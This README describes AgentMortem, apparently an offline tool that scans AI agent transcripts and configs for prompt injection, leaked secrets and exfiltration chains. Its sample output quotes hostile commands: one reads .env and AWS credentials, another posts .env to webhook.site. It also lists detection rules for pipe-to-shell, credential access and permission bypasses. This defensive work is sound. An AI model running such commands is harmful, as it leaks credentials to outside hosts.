# AgentMortem

**Post-mortem forensics for AI agent sessions.**

AgentMortem hunts what *already happened*: prompt-injection attempts, leaked
secrets, and dangerous capability sequences (the read → send exfiltration
chain) in agent transcripts and agent configuration files.

- 🔍 **Deterministic** — regex + heuristic rules. No LLM, no model download, no "AI-based detection" black box.
- 📴 **Offline** — zero runtime dependencies, zero network calls, zero telemetry. Your transcripts never leave your machine.
- ⚙️ **CI-first** — console, JSON, and [SARIF](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html) output, threshold exit codes, and a ready-made GitHub Action.
- 🐍 **Zero dependencies** — pure Python 3.10+ standard library.

> Think of it as **TruffleHog for AI agents**: wire it into your pipeline and
> fail the build when a session log or agent config looks compromised or
> dangerously permissive.

---

## Why another agent security tool?

| Existing category | Examples | Gap |
| --- | --- | --- |
| Offensive red-teaming | Garak, PyRIT, promptfoo | Tests models *before* deployment; doesn't audit what sessions *did* |
| Runtime guardrail proxies | LLM Guard, NeMo, Aegis | Heavy, framework-coupled, needs a model at inference time |
| MCP server scanners | mcp-scanner, mcps-audit, Snyk agent-scan | Server-side focus, often cloud-API-dependent |

Nobody owns the lightweight **after-the-fact audit** of the artifacts teams
already have: session transcripts, `.claude/settings.json`, `.mcp.json`,
`AGENTS.md` / `CLAUDE.md` / `.cursorrules`. That's AgentMortem.

## What it detects

**Transcripts** (JSONL event logs — Claude Code style — and JSON chat logs — OpenAI style):

| Area | Rules | Examples |
| --- | --- | --- |
| Prompt injection | AM-1001 … AM-1008 | instruction overrides, jailbreaks, system-prompt exfil, base64 smuggling, zero-width Unicode, hidden HTML, exfil drop-point hosts |
| Secret leakage | AM-2001 … AM-2012 | AWS/GitHub/OpenAI/Slack/Stripe/Telegram/Google keys, PEM private keys, JWTs, DB connection strings, credential assignments, high-entropy tokens |
| Capability risk | AM-3001 … AM-3007 | **exfiltration chains** (sensitive read → outbound send), pipe-to-shell, destructive commands, credential access, privilege escalation, sensitive system writes, outbound exfil destinations |

**Config** (auto-discovered in a directory, or pass a single file):

| Area | Rules | Examples |
| --- | --- | --- |
| Allowlists | AM-4001, AM-4002, AM-4006 | `Bash(*)`, `dangerouslySkipPermissions`, auto-approve flags |
| MCP servers | AM-4003, AM-4004, AM-3002/3007 | insecure `http://` endpoints, raw IPs, suspicious hosts, secrets in `env`, pipe-to-shell launch commands |
| Instruction files | AM-4005, AM-1008, AM-2xxx | injection-style text in AGENTS.md/CLAUDE.md/.cursorrules, exfil hosts, embedded secrets |

Full catalog with examples: [docs/rules.md](docs/rules.md).

## Install

```bash
# from this repository
pip install .

# or with uv
uv tool install .
```

Requires Python 3.10+. No other dependencies.

## Quick start

```bash
$ agentmortem scan examples/transcripts/malicious_session.jsonl

AgentMortem v0.1.0 — transcript scan of examples/transcripts/malicious_session.jsonl
  6 messages scanned

  10 findings: 1 critical · 3 high · 6 medium

  MEDIUM   AM-3004  Credential file access
             examples/transcripts/malicious_session.jsonl · line 2 · message #1
             │ cat .env && ls ~/.aws/
             → Legitimate in some workflows, but combined with outbound network calls
               it becomes an exfiltration chain. Review the rest of the session.

  HIGH     AM-2001  AWS access key ID
             examples/transcripts/malicious_session.jsonl · line 3 · message #2
             │ ...AWS_ACCESS_KEY_ID=[REDACTED-AWS-ACCESS-KEY-ID]...
             → Rotate the access key in IAM, audit CloudTrail for usage, and purge
               the value from the transcript and any log stores that captured it.

  CRITICAL AM-3001  Data exfiltration chain
             examples/transcripts/malicious_session.jsonl · line 5 · message #4
             │ curl -X POST -d @.env https://webhook.site/...
             → Break the read→send path: least-privilege tool access, egress
               allowlists, and human approval for outbound transmissions after
               sensitive reads.
```

Notes:

- Secret **values are redacted** in all reports (`[REDACTED-<TYPE>]`). The
  scanner never echoes credentials into its own output.
- Exit code is `1` when the max finding severity reaches `--fail-on`
  (default `medium`), `0` otherwise, `2` on usage/parse errors.

### Scanning agent configuration

```bash
$ agentmortem scan examples/configs/bad-agent

  CRITICAL AM-4002  All permission prompts disabled          # dangerouslySkipPermissions
  HIGH     AM-4001  Unrestricted shell access granted        # Bash(*)
  HIGH     AM-4004  Secret in agent config environment       # GitHub token in env
  HIGH     AM-4003  MCP endpoint on suspicious host          # webhook.site
  MEDIUM   AM-4003  MCP endpoint uses insecure transport     # http://
  MEDIUM   AM-4005  Instruction file contains injection-like text  # AGENTS.md
  ...
```

Auto-detected files: `AGENTS.md`, `CLAUDE.md`, `.cursorrules`,
`.windsurfrules`, `GEMINI.md`, `copilot-instructions.md`, `.cursor/rules/*`,
`.mcp.json` / `mcp.json` / `claude_desktop_config.json`, and
`.claude/settings.json(.local)`. Unknown files still get a line-oriented
secret scan.

### JSON & SARIF

```bash
agentmortem scan path --format json > report.json
agentmortem scan path --format sarif -o report.sarif
```

## CI / GitHub Actions

### Use the bundled Action

```yaml
name: Agent security audit
on: [push, pull_request]
jobs:
  agentmortem:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4
      - uses: something995/New-idea@v1        # point at a release tag once tagged
        with:
          path: agent-sessions                # transcript dir, config dir, or file
          mode: auto
          fail-on: medium
          sarif-file: agentmortem.sarif
```

The Action scans the target, uploads SARIF to GitHub code scanning, and
fails the workflow if the severity gate is hit. (Until the first tag,
install in your workflow with `pip install "agentmortem"` from this repo.)

### Or just run the CLI in a workflow

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-python@v5
  with: { python-version: "3.12" }
- run: pip install ./path/to/agentmortem
- name: Scan agent session logs
  run: agentmortem scan agent-sessions --mode transcript --format sarif --output $GITHUB_WORKSPACE/agentmortem.sarif
- name: Upload SARIF
  uses: actions/github-code-scanning/upload-sarif@v4
  with:
    sarif_file: ${{ github.workspace }}/agentmortem.sarif
```

This repo scans itself in CI — see [.github/workflows/ci.yml](.github/workflows/ci.yml).

## CLI reference

```
agentmortem scan PATH
  --mode auto|transcript|config   target type (default: auto-detect)
  -f, --format text|json|sarif    report format (default: text)
  -o, --output FILE               write report to a file
  --fail-on off|info|low|medium|high|critical   severity gate (default: medium)
  --no-color                      disable ANSI colors
```

`PATH` may be a transcript file (`.json` / `.jsonl` / `.ndjson`), a directory
of transcripts (`--mode transcript`), an agent config directory, or a single
config file. In `auto` mode a directory is treated as config, and a file is
parsed as a transcript first, falling back to config scanning.

## Python API

```python
from agentmortem import parse_transcript, scan_transcript, audit_config

findings, stats = scan_transcript(parse_transcript("session.jsonl"), "session.jsonl")
for f in findings:
    print(f.rule_id, f.severity.label, f.title, f.location.display)

for f in audit_config(".claude"):
    print(f.rule_id, f.title)
```

## Security notes

- AgentMortem is **read-only**: it never executes tool calls from a
  transcript, never modifies scanned files, and makes no network requests.
- Reports redact detected secret values. If you still want an extra layer of
  caution, pipe transcripts through your own scrubber before sharing reports.
- Detection is heuristic by design: expect occasional false positives (e.g.
  a blog post about prompt injection will trip AM-1001). Tune `--fail-on`
  per pipeline; treat findings as *signals for human review*, not verdicts.

## Limitations & roadmap

- **v0.1 scope**: two transcript formats, static rule packs, single-host
  forensics. No multi-session correlation yet.
- Planned: custom rule packs (YAML), more transcript formats (OpenTelemetry
  GenAI events, LangSmith/Langfuse exports), session-to-session diffing,
  `uvx agentmortem` entrypoint packaging, PyPI release.
- Regex heuristics won't catch novel injection phrasings — that's the trade
  for being deterministic, offline, and free. Pair AgentMortem with a
  runtime guardrail for defense-in-depth.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). In short: clone, `pip install -e .[dev]`,
`ruff check src tests`, `pytest`, and open a PR. Report security issues via
[SECURITY.md](SECURITY.md) — don't open public issues with attack payloads.

## License

MIT — see [LICENSE](LICENSE).
